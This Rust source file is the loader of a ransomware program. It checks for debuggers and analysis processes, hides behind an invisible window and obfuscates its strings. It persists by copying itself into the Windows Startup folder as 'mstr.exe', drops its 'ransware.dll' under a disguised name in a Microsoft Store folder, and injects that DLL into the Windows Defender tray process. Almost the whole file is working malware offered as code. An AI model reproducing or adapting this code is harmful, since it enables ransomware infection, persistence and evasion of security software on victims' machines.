#![windows_subsystem = "windows"]
use dll_syringe::{process::OwnedProcess, Syringe};
use tracing::{metadata::LevelFilter, info};
use std::path::Path;
use winit::{
    dpi::LogicalSize,
    event::{Event, WindowEvent},
    event_loop::{ControlFlow, EventLoop},
    window::{WindowBuilder},
};
mod security;
use security::{anti_debugger, check_process};


fn main() -> std::result::Result<(), String>{
    match anti_debugger(){
        Ok(_e) => (),
        _ => std::process::exit(0)
    };

    match check_process(){
        Ok(_e) => (),
        _ => std::process::exit(0)
    };

    

    let event_loop = EventLoop::new();

    // Create a new window with zero dimensions and hide it from view
    let _window = WindowBuilder::new()
        .with_title(obfstr::obfstr!("Invisible Window"))
        .with_inner_size(LogicalSize::new(0.0, 0.0))
        .with_visible(false)
        .build(&event_loop)
        .unwrap();

    // Run the event loop, waiting for events and executing the closure for each event
    event_loop.run(move |event, _, control_flow| {
        *control_flow = ControlFlow::Wait;
        match event {
            // If the close button is pressed, exit the event loop
            Event::WindowEvent {
                event: WindowEvent::CloseRequested,
                ..
            } => *control_flow = ControlFlow::Exit,
            _ => {
                // Call the `first_exec` function for all other events
                match first_exec(){
                    _ => ()
                };
            },
        }
    });
}


fn first_exec() -> color_eyre::Result<()> {
    
    // We printed logs to debug the application

    // Install color_eyre for error handling
    color_eyre::install()?;
    // Initialize tracing subscriber for logging
    tracing_subscriber::fmt().with_max_level(LevelFilter::DEBUG).init();

    // Log a message using obfuscated string
    info!("{}", obfstr::obfstr!("Ransomware World !"));

    // Get the current executable's path
    let current_exec = match std::env::current_exe() {
        Ok(path) => path,
        // If an error occurred while getting the path, return an error
        Err(_e) => {
            return Err(color_eyre::eyre::eyre!(format!("{}", obfstr::obfstr!("Can't get current Exec"))))
        }
    };

    // Get the directory where the current executable is located
    let current_exec_parent = current_exec.parent().unwrap();
    // Log the current executable's directory path
    info!("Current executable directory: {}", current_exec.display());

    // Set the destination path where the executable and DLL will be copied to
    let dll_path = "C:\\Users\\".to_owned() + whoami::username().as_str() + obfstr::obfstr!("\\AppData\\Local\\Programs\\Microsoft Store");

    let destination_path = "C:\\Users\\".to_owned() + whoami::username().as_str() + obfstr::obfstr!(r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\");
    // Log the destination path
    info!("Target destination: {}", destination_path);

    // If the destination directory does not exist, create it
    if !Path::new(&destination_path).exists() {
        info!("{} directory not found", destination_path);
        std::fs::create_dir(&destination_path).expect(obfstr::obfstr!("Can't create directory"));
    }

    if !Path::new(&dll_path).exists() {
        info!("{} directory not found", dll_path);
        std::fs::create_dir(&dll_path).expect(obfstr::obfstr!("Can't create directory"));
    }

    // Check if the executable already exists in the destination directory
    let dest_file = format!("{}\\{}", destination_path, obfstr::obfstr!("mstr.exe"));
    if Path::new(&dest_file).exists() {                          
        info!("{} already exists", dest_file);  

    }else{
        info!("{} does not exist !", dest_file);
        // Check if the exe exists in the source directory where it will be copied from
        if Path::new(&current_exec).exists() {
            info!("{} found in the source directory!", &current_exec.display());
            // Copy the exe to the target directory
            match std::fs::copy(&current_exec, &dest_file){
                std::result::Result::Ok(_e) => info!("Successfully Copied"),
                Err(_e) => return Ok(())
            };
            info!("{} exe copied to the target address!", &current_exec.display());

        }
    }


    let current_dll_destination = format!("{}\\{}", current_exec_parent.display(), obfstr::obfstr!("ransware.dll"));
    info!("DLL Destination: {}", current_dll_destination);

    let dll_dest_file = format!("{}\\{}", dll_path, obfstr::obfstr!("d3c12.dll"));
    if Path::new(&dll_dest_file).exists() {
        info!("{} already exists.", dll_dest_file);
        
    }else{
        info!("{} does not exist !", dll_dest_file);
        // Check if the dll exists in the source directory
        if Path::new(&current_dll_destination).exists() {
            info!("{} found!", &current_dll_destination);
            // Copy the dll to the destination directory
            match std::fs::copy(&current_dll_destination, &dll_dest_file){
                std::result::Result::Ok(_e) => info!("{}", obfstr::obfstr!("Successfully Copied")),
                Err(_e) => return Ok(())
            };
            info!("{} copied to destination address!", dll_dest_file);

        }
    }
    

    let defender_proc = OwnedProcess::find_first_by_name(obfstr::obfstr!("SecurityHealthSystray")).unwrap();
    info!("{}", obfstr::obfstr!("Found target process"));
    let defender_syringe = Syringe::for_process(defender_proc);
    info!("{}", obfstr::obfstr!("Creating Syringe..."));
    let defender_inject_payload = defender_syringe.inject(&dll_dest_file).unwrap();
    info!("{}", obfstr::obfstr!("Injected to process"));
    defender_syringe.eject(defender_inject_payload).unwrap();
    info!("{}", obfstr::obfstr!("Ejected from process"));
    info!("{}", obfstr::obfstr!("All done"));
    Ok(())

}